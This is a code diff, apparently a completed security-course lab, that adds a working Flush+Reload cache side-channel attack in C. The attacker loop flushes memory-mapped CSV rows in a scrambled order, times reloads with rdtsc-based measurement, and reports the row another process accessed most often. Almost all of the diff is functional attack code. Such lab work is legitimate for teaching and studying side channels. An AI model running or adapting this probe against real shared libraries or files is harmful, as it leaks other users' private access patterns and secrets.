@@ -8,6 +8,8 @@
 #include <sys/stat.h>
 #include <unistd.h>
 #include <x86intrin.h>
+#define HIT_TIME 15
+#define CSV_ITEM_NUM 84
 
 /* Lengths of each row in the CSV file. */
 int csv_offsets[] = {
@@ -95,10 +97,59 @@ int main(int argc, char *argv[]) {
     printf("error: failed to mmap\n");
     return 1;
   }
-  int scan_idx = 0, row_idx=0, min_idx=0;
+  int scan_idx = 0, row_idx = 0;
   uint64_t time;
-  while(1) {
-    row_idx = (scan_idx*10037 + 2333) % (84-min_idx);
+  unsigned char *offset_addrs[CSV_ITEM_NUM];
+  uint64_t tmp_offset = 0;
+  int check_flag[CSV_ITEM_NUM];
+  int hit_count[CSV_ITEM_NUM];
+  int cur_hit_max = 0;
+  int cur_hit_max_idx = -1;
+  int check_count = 0;
+  for (int i = 0; i < CSV_ITEM_NUM; i++) {
+    tmp_offset += csv_offsets[i];
+    offset_addrs[i] = addr + tmp_offset;
+    check_flag[i] = 0;
+    hit_count[i] = 0;
+  }
+  while (1) {
+    scan_idx++;
+    row_idx = (scan_idx * 10037 + 2333) % CSV_ITEM_NUM;
+    if (row_idx < 0) {
+      row_idx += CSV_ITEM_NUM;
+    }
+    if (check_flag[row_idx] == HIT_TIME) {
+      continue;
+    }
+
+    check_flag[row_idx] += 1;
+    check_count += 1;
+
+    flush(offset_addrs[row_idx]);
+    for(int i=0;i<15;i++)
+    sched_yield();
+    time = measure_one_block_access_time(offset_addrs[row_idx]);
+    if (time <= hit_time + 20) {
+      //printf("hit %d\t%d\n", row_idx, hit_count[row_idx]);
+      hit_count[row_idx] += 1;
+    }
+    if (hit_count[row_idx] > cur_hit_max) {
+      cur_hit_max = hit_count[row_idx];
+      cur_hit_max_idx = row_idx;
+    }
+    if (check_count == HIT_TIME * CSV_ITEM_NUM) {
+      if (cur_hit_max_idx > 0 & cur_hit_max>=3) {
+        printf("%d\t%d\n", cur_hit_max_idx + 1, cur_hit_max);
+      }
+      for (int i = 0; i < CSV_ITEM_NUM; i++) {
+        check_flag[i] = 0;
+        hit_count[i] = 0;
+      }
+      check_count = 0;
+      cur_hit_max_idx = -1;
+      cur_hit_max = 0;
+    }
+    // printf("%d\n", time);
   }
   /* Insert your code here. Things to keep in mind:
      1. Do not scan the cache sets sequentially.
